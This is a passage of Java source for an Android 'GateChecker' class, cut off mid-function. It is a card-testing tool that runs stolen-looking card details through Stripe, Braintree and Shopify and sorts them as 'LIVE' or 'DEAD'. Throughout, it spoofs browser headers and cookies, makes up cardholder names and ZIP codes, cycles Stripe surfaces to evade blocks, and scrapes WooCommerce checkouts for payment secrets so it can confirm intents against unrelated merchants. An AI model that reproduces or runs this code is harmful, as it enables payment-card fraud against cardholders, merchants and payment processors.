package com.h0checker.app;

import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class GateChecker {

    private static final String TAG = "GateChecker";
    private static final Random rand = new Random();

    private static final String[] CCN_LIVE_CODES = {
        "insufficient_funds","do_not_honor","generic_decline","call_issuer",
        "try_again_later","not_permitted","service_not_allowed",
        "transaction_not_allowed","authentication_required","approve_with_id",
        "issuer_not_available","withdrawal_count_limit_exceeded",
        "reenter_transaction","card_declined","card_velocity_exceeded",
        "not_sufficient_funds","incorrect_zip","cvc_check_failed",
        "online_or_offline_pin_required","stop_payment_order","debit_card_not_supported"
    };
    private static final String[] DEAD_CODES = {
        "expired_card","incorrect_number","invalid_number","invalid_expiry_month",
        "invalid_expiry_year","lost_card","stolen_card","pickup_card",
        "restricted_card","fraudulent","merchant_blacklist","security_violation",
        "invalid_account","testmode_decline","revoked_card"
    };
    private static final String[] THREE_DS_CODES = {
        "authentication_required","card_authentication_required",
        "payment_intent_authentication_failure","three_d_secure_authentication","three_d_secure_redirect"
    };

    // ══════════════════════════════════════════════════════════════════
    //  MAIN DISPATCHER — routes by gateType + subType
    // ══════════════════════════════════════════════════════════════════
    public static CheckResult checkCard(String cardStr, JSONObject gate) {
        long start = System.currentTimeMillis();
        try {
            String gateType = gate.optString("gateType", "stripe");
            String subType = gate.optString("subType", "tokenize");
            JSONObject settings = gate.optJSONObject("settings");
            if (settings == null) settings = new JSONObject();

            String[] parts = cardStr.split("[|/]");
            if (parts.length < 4) return error("Invalid card format. Use: number|mm|yyyy|cvc");
            String number = parts[0].trim().replaceAll("\\s+", "");
            String month = parts[1].trim();
            String year = parts[2].trim();
            String cvv = parts[3].trim();
            if (year.length() == 2) { int yr = Integer.parseInt(year); year = yr > 50 ? "19"+year : "20"+year; }

            CheckResult result;
            switch (gateType) {
                case "stripe":    result = checkStripe(number, month, year, cvv, settings, subType); break;
                case "braintree": result = checkBraintree(number, month, year, cvv, settings, subType); break;
                case "shopify":   result = checkShopify(number, month, year, cvv, settings, subType); break;
                case "paypal":    result = checkPaypal(number, month, year, cvv, settings, subType); break;
                case "adyen":     result = checkAdyen(number, month, year, cvv, settings, subType); break;
                case "payeezy":   result = checkPayeezy(number, month, year, cvv, settings, subType); break;
                default:          result = error("Unknown gate type: " + gateType); break;
            }
            result.latency = (int)(System.currentTimeMillis() - start);
            return result;
        } catch (Exception e) {
            Log.e(TAG, "checkCard error", e);
            return error("Check failed: " + e.getMessage(), (int)(System.currentTimeMillis() - start));
        }
    }

    // ══════════════════════════════════════════════════════════════════
    //  STRIPE — tries multiple surfaces like Node.js (pk_ + sk_ both work)
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkStripe(String number, String month, String year,
                                           String cvv, JSONObject s, String subType) throws Exception {
        String pk = s.optString("publicKey", "");
        String sk = s.optString("secretKey", s.optString("stripeSecretKey", ""));
        String acct = s.optString("connectedAccount", s.optString("stripeAccount", ""));
        String siteUrl = s.optString("siteUrl", "");

        if (pk.isEmpty() && sk.isEmpty()) return error("No Stripe keys — add pk_live_... or sk_live_...");

        // ── wc_stripe_confirm_setup_intent: simple PM creation with sk ──
        if ("wc_stripe_confirm_setup_intent".equals(subType) && !sk.isEmpty()) {
            return stripePMWithSecret(number, month, year, cvv, sk, acct);
        }

        // ── checkout_session: create session + confirm ──
        if ("checkout_session".equals(subType) && !sk.isEmpty() && !siteUrl.isEmpty()) {
            return stripeCheckoutSession(number, month, year, cvv, sk, siteUrl);
        }

        // ── All other subtypes: try WC scrape + PI confirm first (richest result) ──
        if (!siteUrl.isEmpty()) {
            CheckResult wcResult = stripeWcFlow(number, month, year, cvv, sk, pk, acct, siteUrl, subType);
            if (wcResult != null) return wcResult;
        }

        // Multi-surface tokenize (matches Node.js stripeTokenize exactly)
        return stripeTokenizeMultiSurface(number, month, year, cvv, pk, sk, acct, siteUrl);
    }

    // ── Stripe: Multi-surface tokenize (tries tokens + payment_methods) ──
    private static CheckResult stripeTokenizeMultiSurface(String number, String month, String year,
                                                           String cvv, String pk, String sk, String acct,
                                                           String siteUrl) throws Exception {
        String name = randomName();
        String zip = String.format("%05d", rand.nextInt(99999));
        String refDomain = siteUrl.isEmpty() ? "https://js.stripe.com" : siteUrl;
        String stripeVer = "11";

        Map<String, String> h = buildStripeHeaders();

        // Surfaces to try — tokens first (pk works), then payment_methods
        String[][] surfaces = {
            {"tokens",              "card-element"},
            {"tokens",              "payment-element"},
            {"payment_methods",     "split-card-element"},
            {"payment_methods",     "payment-element"},
            {"payment_methods",     "card-element"},
            {"payment_methods",     "link-authentication-element"},
            {"payment_methods",     "express-checkout-element"},
        };

        JSONObject lastError = null;

        for (String[] surf : surfaces) {
            String endpoint = surf[0];
            String surface = surf[1];

            StringBuilder body = new StringBuilder();
            if ("tokens".equals(endpoint)) {
                body.append("card[number]=").append(encode(number));
                body.append("&card[cvc]=").append(encode(cvv));
                body.append("&card[exp_month]=").append(encode(month));
                body.append("&card[exp_year]=").append(encode(year));
                body.append("&card[name]=").append(encode(name));
                body.append("&card[address_zip]=").append(encode(zip));
                body.append("&card[address_country]=US");
            } else {
                body.append("type=card");
                body.append("&card[number]=").append(encode(number));
                body.append("&card[cvc]=").append(encode(cvv));
                body.append("&card[exp_month]=").append(encode(month));
                body.append("&card[exp_year]=").append(encode(year));
                body.append("&billing_details[name]=").append(encode(name));
                body.append("&billing_details[address][postal_code]=").append(encode(zip));
                body.append("&billing_details[address][country]=US");
            }
            body.append("&guid=").append(UUID.randomUUID().toString());
            body.append("&muid=").append(UUID.randomUUID().toString());
            body.append("&sid=").append(UUID.randomUUID().toString());
            body.append("&payment_user_agent=stripe.js/").append(stripeVer).append("; stripe-js-v3/").append(stripeVer).append("; ").append(surface);
            body.append("&referrer=").append(encode(refDomain));
            body.append("&time_on_page=").append(rand.nextInt(30000) + 5000);
            body.append("&key=").append(encode(pk));

            String resp = stripePost("https://api.stripe.com/v1/" + endpoint, body.toString(), h);
            JSONObject json = new JSONObject(resp);

            if (json.has("id")) {
                // Success — got tok_ or pm_
                CheckResult result = classifyStripeToken(json);
                if (result != null) return result;
            }

            String errMsg = json.optJSONObject("error") != null
                          ? json.optJSONObject("error").optString("message", "") : "";

            // If NOT an integration surface error, stop trying
            if (!errMsg.contains("integration surface") && !errMsg.contains("publishable key")) {
                lastError = json.optJSONObject("error");
                break;
            }

            // Integration surface blocked — try next surface
        }

        // If we got here, all surfaces were blocked or failed
        if (lastError != null) {
            String code = lastError.optString("code", "");
            String msg = lastError.optString("message", "Unknown error");
            if (isLive(code)) return approved("CCN LIVE | " + fmtDecline(code) + " | " + code, "");
            if (isDead(code)) return declined("DEAD | " + fmtDecline(code) + " | " + code, "");
            if (is3DS(code)) return approved("CCN LIVE (3DS) | " + fmtDecline(code) + " | " + code, "");
            return error("Stripe: " + msg + " [" + code + "]", lastError.toString());
        }

        // Try sk-based PM creation as final fallback
        if (!sk.isEmpty()) {
            return stripePMWithSecret(number, month, year, cvv, sk, acct);
        }

        return error("All Stripe surfaces blocked. Add sk_live_... in gate settings for reliable tokenization.");
    }

    // ── Stripe: Build browser-like headers (matches Node.js exactly) ──
    private static Map<String, String> buildStripeHeaders() {
        int chrome = 128 + rand.nextInt(10);
        String ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
            + chrome + ".0.0.0 Safari/537.36";
        String secChUa = "\"Chromium\";v=\"" + chrome + "\", \"Google Chrome\";v=\"" + chrome + "\", \"Not=A?Brand\";v=\"99\"";
        String gaId = "GA1.1." + (rand.nextInt(900000000) + 100000000) + "." + (System.currentTimeMillis()/1000 - rand.nextInt(86400));
        String gid = "GA1.1." + (rand.nextInt(900000000) + 100000000) + "." + (System.currentTimeMillis()/1000);

        Map<String, String> h = new HashMap<>();
        h.put("Content-Type", "application/x-www-form-urlencoded");
        h.put("Accept", "application/json");
        h.put("accept-language", "en-US,en;q=0.9");
        h.put("Origin", "https://js.stripe.com");
        h.put("Referer", "https://js.stripe.com/");
        h.put("User-Agent", ua);
        h.put("sec-ch-ua", secChUa);
        h.put("sec-ch-ua-mobile", "?0");
        h.put("sec-ch-ua-platform", "\"Windows\"");
        h.put("sec-fetch-dest", "empty");
        h.put("sec-fetch-mode", "cors");
        h.put("sec-fetch-site", "same-site");
        h.put("Cookie", "_ga=" + gaId + "; _gid=" + gid);
        return h;
    }

    // ── Stripe: Classify token/PM response ──
    private static CheckResult classifyStripeToken(JSONObject json) {
        try {
            if (json.has("id")) {
                String id = json.getString("id");
                JSONObject card = json.optJSONObject("card");
                String brand = card != null ? card.optString("brand", "unknown").toUpperCase() : "UNKNOWN";
                String funding = card != null ? card.optString("funding", "unknown") : "unknown";
                String country = card != null ? card.optString("country", "??") : "??";
                boolean tds = card != null && card.optJSONObject("three_d_secure_usage") != null
                           && card.optJSONObject("three_d_secure_usage").optBoolean("supported", false);
                String cvcCheck = card != null && card.optJSONObject("checks") != null
                                ? card.optJSONObject("checks").optString("cvc_check", "") : "";

                String cvcLabel = "CVV UNCHECKED";
                if ("pass".equals(cvcCheck)) cvcLabel = "CVV MATCH";
                else if ("fail".equals(cvcCheck)) cvcLabel = "CVV WRONG";

                return approved(
                    "CCN LIVE | " + brand + " " + funding + " [" + country + "] | " + id + " | " + (tds ? "3DS" : "NO-3DS") + " | " + cvcLabel,
                    json.toString()
                );
            }
        } catch (Exception ignored) {}
        return null;
    }

    // ── Stripe: PM creation with secret key (fallback) ──
    private static CheckResult stripePMWithSecret(String number, String month, String year,
                                                   String cvv, String sk, String acct) throws Exception {
        String name = randomName();
        String email = name.toLowerCase().replace(" ", ".") + "@" + randomDomain();
        String zip = String.format("%05d", rand.nextInt(99999));

        StringBuilder body = new StringBuilder();
        body.append("type=card");
        body.append("&card[number]=").append(encode(number));
        body.append("&card[cvc]=").append(encode(cvv));
        body.append("&card[exp_month]=").append(encode(month));
        body.append("&card[exp_year]=").append(encode(year));
        body.append("&billing_details[name]=").append(encode(name));
        body.append("&billing_details[email]=").append(encode(email));
        body.append("&billing_details[address][postal_code]=").append(encode(zip));
        body.append("&billing_details[address][country]=US");

        Map<String, String> h = new HashMap<>();
        h.put("Content-Type", "application/x-www-form-urlencoded");
        h.put("Accept", "application/json");
        h.put("User-Agent", randomUA());
        h.put("Authorization", "Bearer " + sk);
        if (!acct.isEmpty()) h.put("Stripe-Account", acct);

        String resp = stripePost("https://api.stripe.com/v1/payment_methods", body.toString(), h);
        return classifyStripe(resp);
    }

    // ── Stripe: WC scrape → PI confirm → REAL BANK RESPONSE ──
    private static CheckResult stripeWcFlow(String number, String month, String year,
                                             String cvv, String sk, String pk, String acct,
                                             String siteUrl, String subType) {
        try {
            String clean = siteUrl.replaceAll("/+$", "");
            Map<String,String> ph = new HashMap<>();
            ph.put("User-Agent", randomUA());
            ph.put("Accept", "text/html,application/xhtml+xml");

            // ── Step 1: Try direct setup-intent endpoint ──
            String clientSecret = null;
            String piId = null;
            String intentType = "setup_intents";

            Map<String,String> postH = new HashMap<>();
            postH.put("Content-Type", "application/x-www-form-urlencoded");
            postH.put("Accept", "application/json");
            postH.put("User-Agent", randomUA());
            postH.put("Origin", clean);
            postH.put("Referer", clean + "/checkout/");
            postH.put("X-Requested-With", "XMLHttpRequest");

            String[] setupPaths = {
                clean + "/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
                clean + "/?wc-ajax=wc_stripe_frontend_request&path=%2Fwc-stripe%2Fv1%2Fsetup-intent"
            };
            for (String url : setupPaths) {
                try {
                    String resp = httpPost(url, "payment_method=stripe_cc", postH);
                    clientSecret = extractBetween(resp, "\"client_secret\":\"", "\"");
                    if (clientSecret != null && !clientSecret.isEmpty()) {
                        piId = clientSecret.split("_secret_")[0];
                        intentType = "setup_intents";
                        break;
                    }
                } catch (Exception ignored) {}
            }

            // ── Step 2: Try WC Store API → add product to cart → scrape checkout page for PI ──
            if (clientSecret == null || clientSecret.isEmpty()) {
                try {
                    String prodResp = httpGet(clean + "/wp-json/wc/store/v1/products?per_page=5&orderby=price&order=asc", ph);
                    JSONArray products = new JSONArray(prodResp);
                    for (int i = 0; i < products.length(); i++) {
                        JSONObject prod = products.getJSONObject(i);
                        if (prod.optBoolean("is_in_stock", true) && prod.optBoolean("is_purchasable", true)) {
                            String pid = prod.getString("id");
                            // Add to cart
                            httpGet(clean + "/?add-to-cart=" + pid, ph);
                            // Go to checkout
                            String checkResp = httpGet(clean + "/checkout/", ph);
                            // Extract PI from checkout page
                            String[] piPatterns = {
                                "client_secret[\"':]+[\"']([^\"']+)",
                                "data-client-secret=\"([^\"]+)\"",
                                "pi_[A-Za-z0-9]+_secret_[A-Za-z0-9]+",
                                "seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+"
                            };
                            for (String pat : piPatterns) {
                                String found = extractPattern(checkResp, pat);
                                if (found != null && !found.isEmpty()) {
                                    clientSecret = found;
                                    piId = found.contains("_secret_") ? found.split("_secret_")[0] : "";
                                    intentType = piId.startsWith("seti_") ? "setup_intents" : "payment_intents";
                                    break;
                                }
                            }
                            if (clientSecret != null) break;
                        }
                    }
                } catch (Exception e) {
                    Log.d(TAG, "Store API scrape: " + e.getMessage());
                }
            }

            // ── Step 3: If we have a PI, confirm it → REAL BANK RESPONSE ──
            if (clientSecret != null && !clientSecret.isEmpty() && piId != null && !piId.isEmpty()) {
                return stripeConfirmIntent(number, month, year, cvv, sk, pk, acct, piId, clientSecret, intentType);
            }

        } catch (Exception e) {
            Log.d(TAG, "WC flow: " + e.getMessage());
        }
        return null;
    }

    // ── Stripe: Confirm a PaymentIntent/SetupIntent → REAL BANK RESPONSE ──
    private static CheckResult stripeConfirmIntent(String number, String month, String year,
                                                     String cvv, String sk, String pk, String acct,
                                                     String piId, String clientSecret, String intentType) throws Exception {
        String name = randomName();
        String email = name.toLowerCase().replace(" ", ".") + "@" + randomDomain();
        String zip = String.format("%05d", rand.nextInt(99999));

        // Step 1: Create token via browser-like headers (pk works)
        StringBuilder tokBody = new StringBuilder();
        tokBody.append("card[number]=").append(encode(number));
        tokBody.append("&card[cvc]=").append(encode(cvv));
        tokBody.append("&card[exp_month]=").append(encode(month));
        tokBody.append("&card[exp_year]=").append(encode(year));
        tokBody.append("&card[name]=").append(encode(name));
        tokBody.append("&card[address_zip]=").append(encode(zip));
        tokBody.append("&card[address_country]=US");
        tokBody.append("&guid=").append(UUID.randomUUID());
        tokBody.append("&muid=").append(UUID.randomUUID());
        tokBody.append("&sid=").append(UUID.randomUUID());
        tokBody.append("&payment_user_agent=stripe.js/11; stripe-js-v3/11; card-element");
        tokBody.append("&referrer=https://js.stripe.com");
        tokBody.append("&time_on_page=").append(rand.nextInt(30000) + 5000);
        if (!pk.isEmpty()) tokBody.append("&key=").append(encode(pk));

        Map<String, String> tokH = buildStripeHeaders();
        if (!sk.isEmpty()) tokH.put("Authorization", "Bearer " + sk);

        String tokResp = stripePost("https://api.stripe.com/v1/tokens", tokBody.toString(), tokH);
        JSONObject tokJson = new JSONObject(tokResp);
        String tokenId = tokJson.optString("id", "");

        // If token failed, try PM endpoint
        if (!tokenId.startsWith("tok_")) {
            StringBuilder pmBody = new StringBuilder();
            pmBody.append("type=card");
            pmBody.append("&card[number]=").append(encode(number));
            pmBody.append("&card[cvc]=").append(encode(cvv));
            pmBody.append("&card[exp_month]=").append(encode(month));
            pmBody.append("&card[exp_year]=").append(encode(year));
            pmBody.append("&billing_details[name]=").append(encode(name));
            pmBody.append("&billing_details[address][postal_code]=").append(encode(zip));
            pmBody.append("&billing_details[address][country]=US");
            pmBody.append("&guid=").append(UUID.randomUUID());
            pmBody.append("&muid=").append(UUID.randomUUID());
            pmBody.append("&sid=").append(UUID.randomUUID());
            pmBody.append("&payment_user_agent=stripe.js/11; stripe-js-v3/11; card-element");
            pmBody.append("&referrer=https://js.stripe.com");
            pmBody.append("&time_on_page=").append(rand.nextInt(30000) + 5000);
            if (!pk.isEmpty()) pmBody.append("&key=").append(encode(pk));

            String pmResp = stripePost("https://api.stripe.com/v1/payment_methods", pmBody.toString(), tokH);
            JSONObject pmJson = new JSONObject(pmResp);
            tokenId = pmJson.optString("id", "");
        }

        // Step 2: Confirm PI with the token → gets REAL BANK RESPONSE
        StringBuilder confBody = new StringBuilder();
        confBody.append("payment_method_data[type]=card");
        if (tokenId.startsWith("tok_") || tokenId.startsWith("pm_")) {
            confBody.append("&payment_method_data[card][token]=").append(encode(tokenId));
        } else {
            confBody.append("&payment_method_data[card][number]=").append(encode(number));
            confBody.append("&payment_method_data[card][cvc]=").append(encode(cvv));
            confBody.append("&payment_method_data[card][exp_month]=").append(encode(month));
            confBody.append("&payment_method_data[card][exp_year]=").append(encode(year));
        }
        confBody.append("&payment_method_data[billing_details][name]=").append(encode(name));
        confBody.append("&payment_method_data[billing_details][email]=").append(encode(email));
        confBody.append("&payment_method_data[billing_details][address][postal_code]=").append(encode(zip));
        confBody.append("&payment_method_data[billing_details][address][country]=US");
        confBody.append("&expected_payment_method_type=card");
        confBody.append("&use_stripe_sdk=true");
        confBody.append("&key=").append(encode(pk));
        confBody.append("&client_secret=").append(encode(clientSecret));
        confBody.append("&expand[0]=payment_method");
        confBody.append("&expand[1]=latest_charge.payment_method_details");

        Map<String, String> confH = buildStripeHeaders();
        if (!sk.isEmpty()) confH.put("Authorization", "Bearer " + sk);

        String confResp = stripePost("https://api.stripe.com/v1/" + intentType + "/" + piId + "/confirm",
                                    confBody.toString(), confH);
        return classifyStripeConfirm(confResp);
    }

    // ── Stripe: Classify confirm response → REAL BANK RESPONSE ──
    private static CheckResult classifyStripeConfirm(String resp) {
        try {
            JSONObject j = new JSONObject(resp);
            String status = j.optString("status", "");

            // succeeded → charge confirmed with real bank response
            if ("succeeded".equals(status)) {
                JSONObject pm = j.optJSONObject("payment_method");
                JSONObject card = pm != null ? pm.optJSONObject("card") : null;
                JSONObject latestCharge = j.optJSONObject("latest_charge");
                JSONObject chargePM = latestCharge != null ? latestCharge.optJSONObject("payment_method_details") : null;
                JSONObject chargeCard = chargePM != null ? chargePM.optJSONObject("card") : null;
                JSONObject checks = card != null ? card.optJSONObject("checks") : null;
                if (checks == null && chargeCard != null) checks = chargeCard.optJSONObject("checks");

                String brand = card != null ? card.optString("brand", "unknown").toUpperCase() : "UNKNOWN";
                String funding = card != null ? card.optString("funding", "unknown") : "unknown";
                String country = card != null ? card.optString("country", "??") : "??";
                boolean tds = card != null && card.optJSONObject("three_d_secure_usage") != null
                           && card.optJSONObject("three_d_secure_usage").optBoolean("supported", false);
                String cvcCheck = checks != null ? checks.optString("cvc_check", "") : "";
                String avsZip = checks != null ? checks.optString("address_postal_code_check", "") : "";
                String avsAddr = checks != null ? checks.optString("address_line1_check", "") : "";

                String cvv = "CVV UNCHECKED";
                if ("pass".equals(cvcCheck)) cvv = "CVV MATCH";
                else if ("fail".equals(cvcCheck)) cvv = "CVV WRONG";

                String chargeId = "";
                if (latestCharge != null) chargeId = latestCharge.optString("id", "");

                return approved(
                    "CVV LIVE | " + brand + " " + funding + " [" + country + "] | "
                    + (tds ? "3DS" : "NO-3DS") + " | " + cvv
                    + (avsZip.equals("pass") ? " | AVS-ZIP OK" : "")
                    + (avsAddr.equals("pass") ? " | AVS-ADDR OK" : "")
                    + (chargeId.isEmpty() ? "" : " | " + chargeId), resp);
            }

            // requires_action → 3DS
            if ("requires_action".equals(status)) {
                return approved("CCN LIVE (3DS) | Requires authentication | " + j.optString("id", ""), resp);
            }

            // requires_payment_method → card was declined during confirm
            if ("requires_payment_method".equals(status)) {
                JSONObject lpe = j.optJSONObject("last_payment_error");
                if (lpe != null) {
                    String errMsg = lpe.optString("message", "Card declined");
                    String code = lpe.optString("code", "");
                    String dc = lpe.optString("decline_code", code);
                    if (isLive(dc)) return approved("CCN LIVE | " + fmtDecline(dc) + " | " + dc, resp);
                    if (isDead(dc)) return declined("DEAD | " + fmtDecline(dc) + " | " + dc, resp);
                    if (is3DS(dc)) return approved("CCN LIVE (3DS) | " + fmtDecline(dc) + " | " + dc, resp);
                    return error("Stripe: " + errMsg + " [" + dc + "]", resp);
                }
                return error("Card declined (requires_payment_method)", resp);
            }

            // error object
            JSONObject errObj = j.optJSONObject("error");
            if (errObj != null) {
                String code = errObj.optString("code", "");
                String dc = errObj.optString("decline_code", code);
                String msg = errObj.optString("message", "Error");
                if ("authentication_required".equals(code) || "invalid_api_key".equals(code))
                    return error("Invalid Stripe API key", resp);
                if (isLive(dc)) return approved("CCN LIVE | " + fmtDecline(dc) + " | " + dc, resp);
                if (isDead(dc)) return declined("DEAD | " + fmtDecline(dc) + " | " + dc, resp);
                if (is3DS(dc)) return approved("CCN LIVE (3DS) | " + fmtDecline(dc) + " | " + dc, resp);
                return error("Stripe: " + msg + " [" + dc + "]", resp);
            }

            return error("Unknown Stripe response", resp);
        } catch (Exception e) { return error("Parse: " + e.getMessage(), resp); }
    }
    private static CheckResult stripeCheckoutSession(String number, String month, String year,
                                                      String cvv, String sk, String siteUrl) throws Exception {
        Map<String, String> h = new HashMap<>();
        h.put("Content-Type", "application/json");
        h.put("Authorization", "Bearer " + sk);
        h.put("User-Agent", randomUA());

        JSONObject body = new JSONObject();
        body.put("payment_method_types", new JSONArray().put("card"));
        body.put("mode", "setup");
        body.put("success_url", siteUrl + "/success");
        body.put("cancel_url", siteUrl + "/cancel");

        String resp = stripePost("https://api.stripe.com/v1/checkout/sessions", body.toString(), h);
        JSONObject json = new JSONObject(resp);
        String csId = json.optString("id", "");
        String setupClientSecret = json.optString("setup_intent_client_secret", "");

        if (!csId.isEmpty() && !setupClientSecret.isEmpty()) {
            String piId = setupClientSecret.contains("_secret_") ? setupClientSecret.split("_secret_")[0] : "";
            if (!piId.isEmpty()) {
                return stripeConfirmIntent(number, month, year, cvv, sk, "", "", piId, setupClientSecret, "setup_intents");
            }
        }
        return classifyStripe(resp);
    }

    // ── Stripe response classifier ──
    private static CheckResult classifyStripe(String resp) {
        try {
            JSONObject json = new JSONObject(resp);
            if (json.has("id")) {
                JSONObject card = json.optJSONObject("card");
                String brand = card != null ? card.optString("brand","unknown").toUpperCase() : "UNKNOWN";
                String funding = card != null ? card.optString("funding","unknown") : "unknown";
                String country = card != null ? card.optString("country","??") : "??";
                boolean tds = card != null && card.optJSONObject("three_d_secure_usage") != null
                           && card.optJSONObject("three_d_secure_usage").optBoolean("supported", false);
                return approved("CCN LIVE | " + brand + " " + funding + " [" + country + "] | " + json.optString("id") + " | " + (tds?"3DS":"NO-3DS"), resp);
            }
            // Handle confirm result with status
            String status = json.optString("status", "");
            if ("succeeded".equals(status)) {
                JSONObject pm = json.optJSONObject("payment_method");
                JSONObject c = pm != null ? pm.optJSONObject("card") : null;
                String brand = c != null ? c.optString("brand","unknown").toUpperCase() : "UNKNOWN";
                String funding = c != null ? c.optString("funding","unknown") : "unknown";
                String country = c != null ? c.optString("country","??") : "??";
                return approved("CCN LIVE | " + brand + " " + funding + " [" + country + "] | Charge confirmed", resp);
            }
            if ("requires_action".equals(status)) {
                return approved("CCN LIVE (3DS) | Requires authentication | " + json.optString("id",""), resp);
            }

            JSONObject errObj = json.optJSONObject("error");
            if (errObj == null) errObj = json.optJSONObject("last_payment_error");
            if (errObj != null) {
                JSONObject errInner = errObj.optJSONObject("error");
                if (errInner != null) errObj = errInner;
                String code = errObj.optString("code","");
                String dc = errObj.optString("decline_code", code);
                String msg = errObj.optString("message","Unknown error");
                if ("authentication_required".equals(code)||"invalid_api_key".equals(code))
                    return error("Invalid Stripe API key", resp);
                if (isLive(dc)) return approved("CCN LIVE | " + fmtDecline(dc) + " | " + dc, resp);
                if (isDead(dc)) return declined("DEAD | " + fmtDecline(dc) + " | " + dc, resp);
                if (is3DS(dc)) return approved("CCN LIVE (3DS) | " + fmtDecline(dc) + " | " + dc, resp);
                return error("Stripe: " + msg + " [" + dc + "]", resp);
            }
            return error("Unknown Stripe response", resp);
        } catch (Exception e) { return error("Parse: " + e.getMessage(), resp); }
    }

    // ══════════════════════════════════════════════════════════════════
    //  BRAINTREE — subtype-aware
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkBraintree(String number, String month, String year,
                                              String cvv, JSONObject s, String subType) throws Exception {
        String token = s.optString("authFingerprint", s.optString("btClientToken", ""));
        String siteUrl = s.optString("siteUrl", "");
        if (token.isEmpty()) return error("No Braintree client token configured");

        // Decode JWT to get auth fingerprint
        if (token.startsWith("ey")) {
            try {
                String[] parts = token.split("\\.");
                String decoded = new String(Base64.decode(parts[1], Base64.DEFAULT));
                JSONObject payload = new JSONObject(decoded);
                token = payload.optString("authorizationFingerprint", token);
            } catch (Exception ignored) {}
        }

        String zip = String.format("%05d", rand.nextInt(99999));
        String sid = UUID.randomUUID().toString();

        JSONObject cc = new JSONObject();
        cc.put("number", number).put("expirationMonth", month).put("expirationYear", year).put("cvv", cvv);
        cc.put("billingAddress", new JSONObject().put("postalCode", zip).put("streetAddress", randomAddress()));

        JSONObject input = new JSONObject();
        input.put("creditCard", cc).put("options", new JSONObject().put("validate", false));

        JSONObject gql = new JSONObject();
        gql.put("clientSdkMetadata", new JSONObject().put("source","client").put("integration","dropin2").put("sessionId", sid));
        gql.put("query", "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 binData { prepaid debit issuingBank countryOfIssuance } } } }");
        gql.put("variables", new JSONObject().put("input", input));
        gql.put("operationName", "TokenizeCreditCard");

        Map<String, String> h = new HashMap<>();
        h.put("Content-Type", "application/json");
        h.put("Authorization", "Bearer " + token);
        h.put("Braintree-Version", "2024-08-01");
        h.put("Origin", "https://assets.braintreegateway.com");
        h.put("Referer", "https://assets.braintreegateway.com/");
        h.put("User-Agent", randomUA());

        String resp = httpPost("https://payments.braintree-api.com/graphql", gql.toString(), h);
        JSONObject json = new JSONObject(resp);

        JSONObject data = json.optJSONObject("data");
        if (data != null) {
            JSONObject tok = data.optJSONObject("tokenizeCreditCard");
            if (tok != null) {
                String btToken = tok.optString("token","");
                JSONObject c = tok.optJSONObject("creditCard");
                if (!btToken.isEmpty()) {
                    String brand = c != null ? c.optString("brandCode","unknown").toUpperCase() : "UNKNOWN";
                    String last4 = c != null ? c.optString("last4","????") : "????";
                    String bank = c != null && c.optJSONObject("binData") != null ? c.optJSONObject("binData").optString("issuingBank","Unknown") : "Unknown";
                    String result = "CCN LIVE | " + brand + " ****" + last4 + " | " + bank + " | " + btToken;

                    // bigcommerce_stencil: submit to BigCommerce API
                    if ("bigcommerce_stencil".equals(subType) && !siteUrl.isEmpty()) {
                        try {
                            String bcResp = submitBigCommerce(btToken, siteUrl);
                            if (bcResp.contains("approved") || bcResp.contains("success"))
                                result = "CCN LIVE | BigCommerce approved | " + brand + " ****" + last4;
                        } catch (Exception ignored) {}
                    }

                    return approved(result, resp);
                }
            }
        }

        JSONArray errors = json.optJSONArray("errors");
        if (errors != null && errors.length() > 0) {
            String msg = errors.getJSONObject(0).optString("message","Unknown");
            if (msg.toLowerCase().contains("expired")) return declined("DEAD | Expired Card | " + msg, resp);
            if (msg.toLowerCase().contains("invalid") || msg.toLowerCase().contains("number"))
                return declined("DEAD | Invalid Card | " + msg, resp);
            return error("Braintree: " + msg, resp);
        }
        return error("Unknown Braintree response", resp);
    }

    private static String submitBigCommerce(String token, String siteUrl) throws Exception {
        Map<String, String> h = new HashMap<>();
        h.put("Content-Type", "application/json");
        h.put("Accept", "application/json");
        h.put("User-Agent", randomUA());
        JSONObject body = new JSONObject();
        body.put("payment_token", token);
        body.put("order_id", 0);
        return httpPost(siteUrl + "/api/public/v1/orders/payments", body.toString(), h);
    }

    // ══════════════════════════════════════════════════════════════════
    //  SHOPIFY — PCI tokenization (all subtypes use same flow)
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkShopify(String number, String month, String year,
                                            String cvv, JSONObject s, String subType) throws Exception {
        String siteUrl = s.optString("siteUrl", "");
        if (siteUrl.isEmpty()) return error("No Shopify site URL configured");
        String sk = s.optString("secretKey", s.optString("stripeSecretKey",""));
        if (!sk.isEmpty()) return stripePMWithSecret(number, month, year, cvv, sk, "");

        String scope = extractShopifyScope(siteUrl);

        Map<String, String> h = new HashMap<>();
        h.put("Content-Type", "application/json");
        h.put("Accept", "application/json");
        h.put("Origin", "https://" + scope);
        h.put("Referer", "https://" + scope + "/");
        h.put("User-Agent", randomUA());

        JSONObject pciBody = new JSONObject();
        JSONObject cc = new JSONObject();
        cc.put("number", number).put("month", Integer.parseInt(month)).put("year", Integer.parseInt(year))
          .put("verification_value", cvv).put("name", randomName());
        pciBody.put("credit_card", cc);
        pciBody.put("payment_session_scope", scope);

        String pciResp = httpPost("https://checkout.pci.shopifyinc.com/sessions", pciBody.toString(), h);
        JSONObject pciJson = new JSONObject(pciResp);
        String sid = pciJson.optString("id","");
        if (sid.isEmpty()) return error("Shopify PCI failed", pciResp);

        Map<String, String> gh = new HashMap<>();
        gh.put("Content-Type", "application/json");
        gh.put("Accept", "application/json");
        gh.put("User-Agent", randomUA());

        JSONObject sub = new JSONObject();
        sub.put("query", "mutation SubmitForCompletion($input: CheckoutSubmitForCompletionInput!) { checkoutSubmitForCompletion(input: $input) { checkout { id ready } userErrors { field message } } }");
        JSONObject addr = new JSONObject();
        addr.put("firstName", randomName().split(" ")[0]).put("lastName", randomName().split(" ")[1]);
